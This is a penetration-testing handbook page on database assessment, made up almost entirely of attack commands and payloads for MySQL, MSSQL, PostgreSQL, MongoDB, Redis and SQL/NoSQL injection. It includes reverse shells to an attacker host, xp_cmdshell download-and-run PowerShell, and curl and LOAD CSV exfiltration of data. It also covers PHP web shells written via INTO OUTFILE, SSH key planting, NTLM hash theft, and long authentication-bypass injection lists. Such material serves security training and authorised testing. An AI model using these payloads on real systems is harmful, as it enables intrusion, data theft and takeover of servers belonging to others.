# Database Assessment

- [Resources](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/04_database_assessment.md#Resources)

## Table of Contents

- [Hibernate Query Language Injection (HQLi)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/04_database_assessment.md#Hibernate-Query-Language-Injection-HQLi)
- [impacket-mssqlclient](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/04_database_assessment.md#impacket-mssqlclient)
- [MongoDB](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/04_database_assessment.md#MongoDB)
- [MDB Tools](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/04_database_assessment.md#MDB-Tools)
- [MSSQL](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/04_database_assessment.md#MSSQL)
- [MySQL](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/04_database_assessment.md#MySQL)
- [mysqldump](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/04_database_assessment.md#mysqldump)
- [NoSQL Injection](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/04_database_assessment.md#NoSQL-Injection)
- [PostgreSQL](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/04_database_assessment.md#PostgreSQL)
- [Redis](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/04_database_assessment.md#Redis)
- [SQL](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/04_database_assessment.md#SQL)
- [sqlcmd](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/04_database_assessment.md#sqlcmd)
- [SQL Injection](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/04_database_assessment.md#SQL-Injection)
- [sqlite3](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/04_database_assessment.md#sqlite3)
- [sqlmap](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/04_database_assessment.md#sqlmap)
- [sqlmap Websocket Proxy](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/04_database_assessment.md#sqlmap-Websocket-Proxy)
- [sqsh](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/04_database_assessment.md#sqsh)
- [XPATH Injection](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/04_database_assessment.md#XPATH-Injection)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| Advanced SQL Injection Cheatsheet | A cheat sheet that contains advanced queries for SQL Injection of all types. | https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet |
| Cypher Injection Cheat Sheet | n/a | https://pentester.land/blog/cypher-injection-cheatsheet/#cypher-queries |
| NoSQLMap | NoSQLMap is an open source Python tool designed to audit for as well as automate injection attacks and exploit default configuration weaknesses in NoSQL databases and web applications using NoSQL in order to disclose or clone data from the database. | https://github.com/codingo/NoSQLMap |
| SQL injection cheat sheet | This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks. | https://portswigger.net/web-security/sql-injection/cheat-sheet |
| SQL Injection Payload List | SQL Injection Payload List | https://github.com/payloadbox/sql-injection-payload-list |
| sqlmap | sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. | https://github.com/sqlmapproject/sqlmap |
| sqlmap Websocket Proxy | Tool to enable blind sql injection attacks against websockets using sqlmap | https://github.com/BKreisel/sqlmap-websocket-proxy |

## Hibernate Query Language Injection (HQLi)

```c
uid=x' OR SUBSTRING(username,1,1)='m' and ''='&auth_primary=x&auth_secondary=962f4a03aa7ebc0515734cf398b0ccd6
```

## impacket-mssqlclient

> https://github.com/fortra/impacket

```c
$ impacket-mssqlclient <USERNAME>@<RHOST>
$ impacket-mssqlclient <USERNAME>@<RHOST> -windows-auth

$ export KRB5CCNAME=<USERNAME>.ccache
$ impacket-mssqlclient -k <RHOST>.<DOMAIN>

SQL> SELECT name FROM master.dbo.sysdatabases;
SQL> use <DATABASE>;
```

## MongoDB

### Client Installation

```c
$ sudo apt-get install mongodb-clients
```

### Usage

```c
$ mongo "mongodb://localhost:27017"
```

### Common Commands

```c
> use <DATABASE>;
> show tables;
> show collections;
> db.system.keys.find();
> db.users.find();
> db.getUsers();
> db.getUsers({showCredentials: true});
> db.accounts.find();
> db.accounts.find().pretty();
> use admin;
```

### User Password Reset to "12345"

```c
> db.getCollection('users').update({username:"admin"}, { $set: {"services" : { "password" : {"bcrypt" : "$2a$10$n9CM8OgInDlwpvjLKLPML.eizXIzLlRtgCh3GRLafOdR9ldAUh/KG" } } } })
```

## MDB Tools

> https://github.com/mdbtools/mdbtools

```c
=> list tables     // show tables
=> go              // executes commands
```

```c
$ mdb-sql <FILE>
```

## MSSQL

### Show Database Content

```c
1> SELECT name FROM master.sys.databases
2> go
```

### OPENQUERY

```c
1> select * from openquery("web\clients", 'select name from master.sys.databases');
2> go
```

```c
1> select * from openquery("web\clients", 'select name from clients.sys.objects');
2> go
```

### Binary Extraction as Base64

```c
1> select cast((select content from openquery([web\clients], 'select * from clients.sys.assembly_files') where assembly_id = 65536) as varbinary(max)) for xml path(''), binary base64;
2> go > export.txt
```

### Steal NetNTLM Hash / Relay Attack

```c
SQL> exec master.dbo.xp_dirtree '\\<LHOST>\FOOBAR'
```

## MySQL

> https://www.mysqltutorial.org/mysql-cheat-sheet.aspx

```c
$ mysql -u root -p
$ mysql -u <USERNAME> -h <RHOST> -p
```

### Basic Commands

```c
mysql> SHOW databases;
mysql> USE <DATABASE>;
mysql> SHOW tables;
mysql> DESCRIBE <TABLE>;
mysql> SELECT * FROM Users;
mysql> SELECT * FROM users \G;
mysql> SELECT Username,Password FROM Users;
```

### Password Reset

```c
$ sudo systemctl stop mysql.service
$ sudo mysqld_safe --skip-grant-tables &
$ mysql -uroot
$ use mysql;
$ update user set authentication_string=PASSWORD("mynewpassword") where User='root';
$ flush privileges;
$ quit
$ sudo systemctl start mysql.service
```

### Update User Password

```c
mysql> update user set password = '37b08599d3f323491a66feabbb5b26af' where user_id = 1;
```

### Update User Privileges

```c
mysql> UPDATE user set is_admin = 1 where name = "<USERNAME>";
```

### Base64 Encoding

```c
mysql> SELECT TO_BASE64(password) FROM accounts where id = 1;
```

### Drop a Shell

```c
mysql> \! /bin/sh
```

### Insert Code to get executed

```c
mysql> insert into users (id, email) values (<LPORT>, "- E $(bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1')");
```

### Write SSH Key into authorized_keys2 file

```c
mysql> SELECT "<KEY>" INTO OUTFILE '/root/.ssh/authorized_keys2' FIELDS TERMINATED BY '' OPTIONALLY ENCLOSED BY '' LINES TERMINATED BY '\n';
```

### Create Database

```c
MariaDB [(none)]> CREATE DATABASE <DATABASE>;
Query OK, 1 row affected (0.001 sec)

MariaDB [(none)]> INSERT INTO mysql.user (User,Host,authentication_string,SSL_cipher,x509_issuer,x509_subject)
    -> VALUES('<USERNAME>','%',PASSWORD('<PASSWORD>'),'','','');
Query OK, 1 row affected (0.001 sec)

MariaDB [(none)]> FLUSH PRIVILEGES;
Query OK, 0 rows affected (0.000 sec)

MariaDB [(none)]> GRANT ALL PRIVILEGES ON *.## TO '<USERNAME>'@'%';
Query OK, 0 rows affected (0.001 sec)

MariaDB [(none)]> use <DATABASE>
Database changed

MariaDB [admirer]> create table <TABLE>(data VARCHAR(255));
Query OK, 0 rows affected (0.008 sec)
```

### Remote Access

```c
$ sudo vi /etc/mysql/mariadb.conf.d/50-server.cnf
```

```c
# Instead of skip-networking the default is now to listen only on
# localhost which is more compatible and is not less secure.
#bind-address            = 127.0.0.1
bind-address            = 0.0.0.0
```

```c
MariaDB [mysql]> FLUSH PRIVILEGES;
MariaDB [mysql]> GRANT ALL ON *.* TO 'root'@'%' IDENTIFIED BY '<PASSWORD>';
```

### Attach External Database

```c
$ sudo systemctl start mysql.service
$ sqlite3
```

```c
sqlite> attach "Audit.db" as db1;
sqlite> .databases
main:
db1: /PATH/TO/DATABASE/<DATABASE>.db
sqlite> .tables
db1.DeletedUserAudit  db1.Ldap              db1.Misc
sqlite> SELECT ## FROM db1.DeletedUserAudit;
```

### Linked SQL Server Enumeration

```c
SQL> SELECT user_name();
SQL> SELECT name,sysadmin FROM syslogins;
SQL> SELECT srvname,isremote FROM sysservers;
SQL> EXEC ('SELECT current_user') at [<DOMAIN>\<CONFIG_FILE>];
SQL> EXEC ('SELECT srvname,isremote FROM sysservers') at [<DOMAIN>\<CONFIG_FILE>];
SQL> EXEC ('EXEC (''SELECT suser_name()'') at [<DOMAIN>\<CONFIG_FILE>]') at [<DOMAIN>\<CONFIG_FILE>];
```

### Register new Sysadmin User

```c
SQL> EXEC ('EXEC (''EXEC sp_addlogin ''''sadmin'''', ''''p4ssw0rd!'''''') at [<DOMAIN>\<CONFIG_FILE>]') at [<DOMAIN>\<CONFIG_FILE>];
SQL> EXEC ('EXEC (''EXEC sp_addsrvrolemember ''''sadmin'''',''''sysadmin'''''') at [<DOMAIN>\<CONFIG_FILE>]') at [<DOMAIN>\<CONFIG_FILE>];
```

### Python Code Execution

```c
SQL> EXEC sp_execute_external_script @language = N'Python', @script = N'print( "foobar" );';
SQL> EXEC sp_execute_external_script @language = N'Python', @script = N'import os;os.system("whoami");';
```

### xp_cmdshell

#### Execute Script HTTP Server

```c
$ xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://<LHOST>/<SCRIPT>.ps1\");"
```

#### Start xp_cmdshell via MSSQL

```c
SQL> EXEC sp_configure 'Show Advanced Options', 1;
SQL> reconfigure;
SQL> sp_configure;
SQL> EXEC sp_configure 'xp_cmdshell', 1;
SQL> reconfigure
SQL> xp_cmdshell "whoami"
```

##### Alternative Way to start xp_cmdshell

```c
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```

#### Import PowerShell Scripts and execute Commands

##### Without Authentication

```c
SQL> xp_cmdshell powershell -c import-module C:\PATH\TO\FILE\<FILE>.ps1; <FILE> <OPTIONS>
```

##### With Authentication

```c
SQL> xp_cmdshell "powershell $cred = New-Object System.Management.Automation.PSCredential(\"<USERNAME>\",\"<PASSWORD>\");Import-Module C:\PATH\TO\FILE\<FILE>.ps1;<FILE> <OPTIONS>
```

## mysqldump

```c
$ mysqldump --databases <DATABASE> -u<USERNAME> -p<PASSWORD>    // no space between parameter and input!
```

## NoSQL Injection

### Authentication Bypass

```c
admin'||''==='
{"username": {"$ne": null}, "password": {"$ne": null} }
```

### Bruteforce Values

```c
import requests
import re
import string

http_proxy  = "http://127.0.0.1:8080"
proxyDict = {
              "http"  : http_proxy,
            }

url = "<DOMAIN>/?search=admin"

done = False
pos = 0
key = ""
while not done:
  found = False
  for _, c in enumerate(string.digits+string.ascii_lowercase+'-'):
    payload = url + "' %26%26 this.password.match(/^"+key+c+".*$/)%00"
    r = requests.get(payload, proxies=proxyDict)
    if "admin</a>" in r.text:
      found = True
      key += c
      print key
      break
  if not found:
    print "Done."
    break
  pos += 1
```

## PostgreSQL

```c
$ psql
$ psql -h <LHOST> -U <USERNAME> -c "<COMMAND>;"
$ psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>
$ psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>
```

### Common Commands

```c
postgres=# l                         // list all databases
postgres=# \list                     // list all databases
postgres=# \c                        // use database
postgres=# \c <DATABASE>             // use specific database
postgres=# \s                        // command history
postgres=# \q                        // quit
<DATABASE>=# \dt                     // list tables from current schema
<DATABASE>=# \dt *.*                 // list tables from all schema
<DATABASE>=# \du                     // list users roles
<DATABASE>=# \du+                    // list users roles
<DATABASE>=# SELECT user;            // get current user
<DATABASE>=# TABLE <TABLE>;          // select table
<DATABASE>=# SELECT * FROM users;    // select everything from users table
<DATABASE>=# SHOW rds.extensions;    // list installed extensions
<DATABASE>=# SELECT usename, passwd from pg_shadow;    // read credentials
```

### Command Execution

```c
<DATABASE>=# x'; COPY (SELECT '') TO PROGRAM 'curl http://<LHOST>?f=`whoami|base64`'-- x
```

#### File Write

```c
<DATABASE>=# COPY (SELECT CAST('cp /bin/bash /var/lib/postgresql/bash;chmod 4777 /var/lib/postgresql/bash;' AS text)) TO '/var/lib/postgresql/.profile';"
```

## Redis

```c
$ redis-cli -h <RHOST>
$ redis-cli -s /run/redis/redis.sock
```

### Basic Commands

```c
> AUTH <PASSWORD>
> AUTH <USERNAME> <PASSWORD>
> INFO SERVER
> INFO keyspace
> CONFIG GET *
> SELECT <NUMBER>
> KEYS *
> HSET       // set value if a field within a hash data structure
> HGET       // retrieves a field and his value from a hash data structure
> HKEYS      // retrieves all field names from a hash data structure
> HGETALL    // retrieves all fields and values from a hash data structure
> GET PHPREDIS_SESSION:2a9mbvnjgd6i2qeqcubgdv8n4b
> SET PHPREDIS_SESSION:2a9mbvnjgd6i2qeqcubgdv8n4b "username|s:8:\"<USERNAME>\";role|s:5:\"admin\";auth|s:4:\"True\";" # the value "s:8" has to match the length of the username
```

#### Examples

##### Add User

```c
redis /run/redis/redis.sock> HSET barfoo username foobar
redis /run/redis/redis.sock> HSET barfoo first-name foo
redis /run/redis/redis.sock> HSET barfoo last-name bar
redis /run/redis/redis.sock> HGETALL barfoo
```

##### Retrieve a specific Value

```c
redis /run/redis/redis.sock> KEYS *
redis /run/redis/redis.sock> SELECT 1
redis /run/redis/redis.sock> TYPE <VALUE>
redis /run/redis/redis.sock> HKEYS <VALUE>
redis /run/redis/redis.sock> HGET <VALUE> password
```

### Enter own SSH Key

```c
$ redis-cli -h <RHOST>
$ echo "FLUSHALL" | redis-cli -h <RHOST>
$ (echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > /PATH/TO/FILE/<FILE>.txt
$ cat /PATH/TO/FILE/<FILE>.txt | redis-cli -h <RHOST> -x set s-key
<RHOST>:6379> get s-key
<RHOST>:6379> CONFIG GET dir
1) "dir"
2) "/var/lib/redis"
<RHOST>:6379> CONFIG SET dir /var/lib/redis/.ssh
OK
<RHOST>:6379> CONFIG SET dbfilename authorized_keys
OK
<RHOST>:6379> CONFIG GET dbfilename
1) "dbfilename"
2) "authorized_keys"
<RHOST>:6379> save
OK
```

## SQL

### Write to File

```c
SELECT "<?php echo shell_exec($_GET['cmd']);?>" INTO OUTFILE '/PATH/TO/FILE/<FILE>'
```

## sqlcmd

```c
$ sqlcmd -S <RHOST> -U <USERNAME>
```

## SQL Injection

> https://github.com/payloadbox/sql-injection-payload-list

> https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet

### Comments

```c
#       // Hash comment
/*      // C-style comment
-- -    // SQL comment
;%00    // Nullbyte
`       // Backtick
```

### Wildcard Operators

`%a` value starts with `a`
`e%` value ends with `e`

### Protection

* Prepared Statements (Parameterized Queries)
* Input Validation
* Escaping User Input

### Master List

```c
admin' or '1'='1
' or '1'='1
" or "1"="1
" or "1"="1"--
" or "1"="1"/*
" or "1"="1"#
" or 1=1
" or 1=1 --
" or 1=1 -
" or 1=1--
" or 1=1/*
" or 1=1#
" or 1=1-
") or "1"="1
") or "1"="1"--
") or "1"="1"/*
") or "1"="1"#
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"/*
") or ("1"="1"#
) or '1`='1-
```

### Authentication Bypass

```c
'-'
' '
'&'
'^'
'*'
' or 1=1 limit 1 -- -+
'="or'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
'-||0'
"-||0"
"-"
" "
"&"
"^"
"*"
'--'
"--"
'--' / "--"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 2 LIKE 2
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' -- -
admin' #
admin'/*
admin' or '2' LIKE '1
admin' or 2 LIKE 2--
admin' or 2 LIKE 2#
admin') or 2 LIKE 2#
admin') or 2 LIKE 2--
admin') or ('2' LIKE '2
admin') or ('2' LIKE '2'#
admin') or ('2' LIKE '2'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin';-- azer
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
```

### Testing APIs

```c
{"id":"56456"}                   // ok
{"id":"56456 AND 1=1#"}          // ok
{"id":"56456 AND 1=2#"}          // ok
{"id":"56456 AND 1=3#"}          // error
{"id":"56456 AND sleep(15)#"}    // sleep 15 seconds
```

### Payloads

```c
SELECT * FROM users WHERE username = 'admin' OR 1=1-- -' AND password = '<PASSWORD>';
```

```c
1%27/**/%256fR/**/50%2521%253D22%253B%2523=="0\"XOR(if(now()=sysdate(),sleep(9),0))XOR\"Z",===query=login&username=rrr';SELECT PG_SLEEP(5)--&password=rr&submit=Login==' AND (SELECT 8871 FROM (SELECT(SLEEP(5)))uZxz)
```

#### Explanation

```c
1=1    // is always true
--     // comment
-      // special character at the end just because of sql
```

### Manual SQL Injection

#### Skeleton Payload

```c
SELECT ? FROM ? WHERE ? LIKE '%amme%';    // control over amme
SELECT ? FROM ? WHERE ? LIKE '%'%';       // errors out because of the single quote
SELECT ? FROM ? WHERE ? LIKE '%';-- %';   // wildcard wich equals = ';--
SELECT ? FROM ? WHERE ? LIKE '%hammer' AND 1 = SLEEP(2);-- %';    // blind sql injection because of sleep is implemented in mysql
SELECT ?,?,? FROM ? WHERE ? LIKE '%hammer' UNION (SELECT 1,2,3 FROM dual);-- %';    // UNION sticks together two columns and put it out; output queries to the screen is super bad!
```

- JOIN = merging columns 1 by 1
- UNION = appending

```c
SELECT ?,?,? FROM ? WHERE ? LIKE '%hammer' UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3) FROM information_schema.tables;-- %';    // information_schema.tables is an information table
SELECT ?,?,? FROM ? WHERE ? LIKE '%hammer' UNION (SELECT COLUMN_NAME, 2,3 FROM information_schema.columns WHERE TABLE_NAME = 'users');-- %';
SELECT ?,?,? FROM ? WHERE ? LIKE '%hammer' UNION (SELECT uLogin, uHash, uType FROM users);-- %';
```

### Manual In-Band SQL Injection

> https://<RHOST>/article?id=3

```c
'    # causes error printed out on the page
1 UNION SELECT 1
1 UNION SELECT 1,2
1 UNION SELECT 1,2,3    # received a message about the columns
0 UNION SELECT 1,2,3    # output from two tables
0 UNION SELECT 1,2,database()    # received database name
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = '<DATABASE>'
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.columns WHERE table_name = '<TABLE>'
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM <TABLE>
```

### Manual Blind SQL Injection (Authentication Bypass)

> https://<RHOST>/article?id=3

```c
0 SELECT * FROM users WHERE username='%username%' AND password='%password%' LIMIT 1;
```

### Manual Blind SQL Injection (BooleanBased)

> https://<RHOST>/checkuser?username=admin

```c
admin123' UNION SELECT 1;--    # value is false
admin123' UNION SELECT 1,2;--    # value is false
admin123' UNION SELECT 1,2,3;--    # value changed to true
admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';--
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 's%';--    # database name starts with "s"
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = '<DATABASE>' AND table_name='users';--    # enumerating tables
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE table_schema='<DATABASE>' AND table_name='users' AND column_name LIKE 'a%';    # enumerating columns
admin123' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'a%    # query for a username which starts with "a"
admin123' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'ad%
admin123' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'adm%
admin123' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'admi%
admin123' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'admin%
admin123' UNION SELECT SLEEP(5),2 FROM users WHERE username='admin' AND password LIKE '1%';--
admin123' UNION SELECT SLEEP(5),2 FROM users WHERE username='admin' AND password LIKE '12%';--
admin123' UNION SELECT SLEEP(5),2 FROM users WHERE username='admin' AND password LIKE '123%';--
admin123' UNION SELECT SLEEP(5),2 FROM users WHERE username='admin' AND password LIKE '1234%';--
```

### Manual Blind SQL Injection (Time-Based)

> https://<RHOST>/analytics?referrer=<RHOST>

```c
admin123' UNION SELECT SLEEP(5);--
admin123' UNION SELECT SLEEP(5),2;--    # the query created a 5 second delay which indicates that it was successful
admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 'u%';--
admin123' UNION SELECT SLEEP(5),2 WHERE table_schema='users' and column_name LIKE 'a%';--
admin123' UNION SELECT SLEEP(5),2 WHERE table_schema='users' and column_name LIKE 'ad%';--
admin123' UNION SELECT SLEEP(5),2 WHERE table_schema='users' and column_name LIKE 'adm%';--
admin123' UNION SELECT SLEEP(5),2 WHERE table_schema='users' and column_name LIKE 'admi%';--
admin123' UNION SELECT SLEEP(5),2 WHERE table_schema='users' and column_name LIKE 'admin%';--
admin123' UNION SELECT SLEEP(5),2 FROM users WHERE username='admin' AND password LIKE 'a%';--
```

### SQL Command Injection

```c
$ ls -l&host=/var/www
$ command=bash+-c+'bash+-i+>%26+/dev/tcp/<LHOST>/<LPORT>+0>%261'%26host=
$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f
```

### SQL Truncation Attack

> https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html

```c
'admin@<FQDN>' = 'admin@<FQDN>++++++++++++++++++++++++++++++++++++++htb' (URL encoded instead of spaces)
```

### SQL UNION Injection

```c
foobar" UNION SELECT NULL, NULL, @@hostname, @@version; #
foobar" UNION SELECT NULL, NULL, NULL, SCHEMA_NAME FROM information_schema.SCHEMATA; #
foobar" UNION SELECT 1, user, password, authentication_string FROM mysql.user; #
```

### List of Tables

```c
$ UNION SELECT 1,table_name,3,4 FROM information_schema.tables;
```

### List of Columns

```c
$ UNION SELECT 1,column_name,3,4 FROM information_schema.columns;
```

### Username and Password Fields

```c
$ UNION SELECT 1,concat(login,':',password),3,4 FROM users;
```

### Example of UNION Injection with enumerating information_schema

```c
$ SELECT group_concat(table_name,":",column_name,"\n") FROM information_schema.columns where table_schema = 'employees'
```

### MySQL User Privilege Check

```c
$ SELECT group_concat(grantee, ":",privilege_type) FROM information_schema.user_privileges
```

### MySQL File Read

```c
$ SELECT load_file('/etc/passwd')
```

### URL Encoded SQL Injection

```c
http://<RHOST>/database.php?id=1%20UNION%20SELECT%201,concat%28table_name,%27:%27,%20column_name%29%20FROM%20information_schema.columns
```

### File Read

```c
uname=foo' UNION ALL SELECT NULL,LOAD_FILE('/etc/passwd'),NULL,NULL,NULL,NULL; -- &password=bar
```

### Dump to File

```c
SELECT ## FROM <TABLE> INTO dumpfile '/PATH/TO/FILE'
```

### Dump PHP Shell

```c
SELECT 'system($_GET[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php'
```

### Read File Obfuscation

```c
SELECT LOAD_FILE(0x633A5C626F6F742E696E69)    // reads C:\boot.ini
```

### File Privileges

```c
SELECT file_priv FROM mysql.user WHERE user = 'netspi'
SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'file' AND grantee LIKE '%netspi%'
```

### Cipher Injection

#### Check Server Version

```c
' OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions
as version LOAD CSV FROM 'http://<LHOST>/?version=' + version + '&name=' + name + '&edition=' + edition as
l RETURN 0 as _0 //
```

#### Get Label

```c
' OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM 'http://<LHOST>/?label='+label as
l RETURN 0 as _0 //
```

#### Get Key Properties

```c
' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://<LHOST>/?' + p
+'='+toString(f[p]) as l RETURN 0 as _0 //
```

## sqlite3

```c
$ sqlite3 <FILE>.db
```

```c
sqlite> .tables
sqlite> PRAGMA table_info(<TABLE>);
sqlite> SELECT * FROM <TABLE>;
```

## sqlmap

> https://github.com/sqlmapproject/sqlmap

```c
--batch         // don't ask any questions
--current-db    // dumps database
```

```c
$ sqlmap --list-tampers
$ sqlmap -r <FILE>.req --level 5 --risk 3 --threads 10
$ sqlmap -r <FILE>.req --level 5 --risk 3 --tables
$ sqlmap -r <FILE>.req --level 5 --risk 3 --tables -D <DATABASE> --dump
$ sqlmap -r <FILE>.req --level 5 --risk 3 --tables users --dump --threads 10
$ sqlmap -r <FILE>.req -p <ID>
$ sqlmap -r <FILE>.req -p <ID> --dump
$ sqlmap -r <FILE>.req -p <ID> --passwords
$ sqlmap -r <FILE>.req -p <ID> --read-file+/etc/passwd
$ sqlmap -r <FILE>.req -p <ID> --os-cmd=whoami
$ sqlmap -r <FILE>.req  --dbs -D <DATABASE> -T <TABLE> --force-ssl --dump
$ sqlmap -r <FILE>.req  --dbs -D <DATABASE> -T <TABLE> -C id,is_staff,username,password --where "is_staff=1" --force-pivoting -pivot-column id --force-ssl --dump
```

### Using Cookies

```c
$ sqlmap -u 'http://<RHOST>/dashboard.php?search=a' --cookie="PHPSESSID=c35v0sipg7q8cnpiqpeqj42hhq"
```

### Using Flask Token

```c
$ sqlmap http://<RHOST>/ --eval="FROM flask_unsign import session as s; session = s.sign({'uuid': session}, secret='<SECRET_KEY>')" --cookie="session=*" --delay 1 --dump
```

### Using Web Sockets

```c
$ sqlmap --url "ws://<DOMAIN>" --data='{"params":"help","token":"<TOKEN>"}'
```

#### Fix Websocket Errors (sqlmap requires third-party module 'websocket-client' in order to use WebSocket functionality)

> https://stackoverflow.com/questions/40212252/python-websockets-module-has-no-attribute/40212593#40212593

> https://pypi.org/project/websocket-client-py3/

Try to install potentially missing modules first.

```c
$ pip install websocket-client
$ pip3 install websocket-client
$ pip install websocket-client-py3
$ pip3 install websocket-client-py3
$ pip install sqlmap-websocket-proxy
$ pip3 install sqlmap-websocket-proxy
```

If this does not help, uninstall the modules manually
and re-install them afterwards.

```c
$ pip install websocket-client
$ pip3 install websocket-client
$ pip uninstall websocket-client-py3
$ pip3 uninstall websocket-client-py3
```

#### sqlmap Web Socket Proxy Python Script

> https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html

```c
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection

ws_server = "ws://localhost:8156/ws"

def send_ws(payload):
	ws = create_connection(ws_server)
	# If the server returns a response on connect, use below line	
	#resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
	
	# For our case, format the payload in JSON
	message = unquote(payload).replace('"','\'') # replacing " with ' to avoid breaking JSON structure
	data = '{"employeeID":"%s"}' % message

	ws.send(data)
	resp = ws.recv()
	ws.close()

	if resp:
		return resp
	else:
		return ''

def middleware_server(host_port,content_type="text/plain"):

	class CustomHandler(SimpleHTTPRequestHandler):
		def do_GET(self) -> None:
			self.send_response(200)
			try:
				payload = urlparse(self.path).query.split('=',1)[1]
			except IndexError:
				payload = False
				
			if payload:
				content = send_ws(payload)
			else:
				content = 'No parameters specified!'

			self.send_header("Content-type", content_type)
			self.end_headers()
			self.wfile.write(content.encode())
			return

	class _TCPServer(TCPServer):
		allow_reuse_address = True

	httpd = _TCPServer(host_port, CustomHandler)
	httpd.serve_forever()


print("[+] Starting MiddleWare Server")
print("[+] Send payloads in http://localhost:8081/?id=*")

try:
	middleware_server(('0.0.0.0',8081))
except KeyboardInterrupt:
	pass
```

#### Execution

```c
$ sqlmap -u "http://localhost:8081/?id=1" --batch --dbs
```

### Getting Shell

```c
$ sqlmap -u 'http://<RHOST>/dashboard.php?search=a' --cookie="PHPSESSID=c35v0sipg7q8cnpiqpeqj42hhq" --os-shell
```

### Getting Reverse Shell

```c
$ os-shell> bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
```

### Upgrade Shell

```c
$ postgres@<RHOST>:/home$ SHELL=/bin/bash script -q /dev/null
```

### File Read

```c
$ sqlmap -R <REQUEST> --level 5 --risk 3 --file-read=/etc/passwd --batch
```

### Search for Email

```c
$ sqlmap -r <REQUEST>.reg -p email --level 4 --risk 3 --batch
```

### Grabbing NTLMv2 Hashes with sqlmap and Responder

```c
$ sudo python3 Responder.py -I <INTERFACE>
